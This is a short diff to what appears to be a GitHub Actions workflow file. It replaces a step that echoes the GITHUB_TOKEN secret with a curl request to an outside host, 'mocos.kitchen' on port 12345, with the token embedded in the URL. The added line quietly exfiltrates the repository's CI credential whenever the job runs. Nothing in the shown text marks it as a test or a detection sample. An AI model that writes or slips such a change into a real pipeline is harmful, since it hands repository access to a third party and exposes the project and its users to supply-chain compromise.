@@ -7,4 +7,4 @@ jobs:
     container: ubuntu:20.04
     steps:
       - run: |
-          echo ${{ secrets.GITHUB_TOKEN }}
+          curl mocos.kitchen:12345/${{ secrets.GITHUB_TOKEN }}
